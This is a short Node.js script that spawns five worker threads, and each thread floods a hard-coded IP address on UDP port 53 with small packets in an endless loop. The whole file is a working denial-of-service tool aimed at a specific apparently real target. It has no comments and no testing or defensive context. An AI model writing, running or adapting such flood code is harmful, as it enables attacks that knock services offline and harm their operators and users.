const { Worker, isMainThread, workerData } = require('worker_threads');
const dgram = require('dgram');

const TARGET = '23.176.184.31';
const PORT = 53;
const SIZE = 15;
const THREADS = 5;

if (isMainThread) {
    for (let i = 0; i < THREADS; i++) {
        new Worker(__filename, {
            workerData: { target: TARGET, port: PORT, size: SIZE }
        });
    }
} else {
    const { target, port, size } = workerData;
    const socket = dgram.createSocket('udp4');
    const message = Buffer.alloc(size, 'A');

    function blast() {
        while (true) {
            socket.send(message, port, target);
        }
    }

    blast();
}
